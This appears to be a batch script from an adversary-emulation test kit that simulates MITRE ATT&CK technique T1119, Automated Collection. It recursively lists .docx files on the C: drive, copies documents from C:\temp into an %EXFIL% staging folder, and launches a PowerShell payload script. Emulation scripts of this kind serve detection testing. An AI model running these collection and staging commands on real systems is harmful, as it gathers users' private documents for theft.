@ECHO OFF

color 0E
ECHO ===========================================================================
ECHO Technique: Automated Collection	(T1119)
ECHO.
ECHO [+] Collection via CMD
cmd /c dir c: /b /s .docx | findstr /e .docx
cmd /c for /R C:\temp\ %%f in (*.docx) do copy %%f %EXFIL%\
ECHO.

ECHO [+] Collection via Powershell
powershell %PAYLOAD%T1119\T1119.ps1
ECHO.
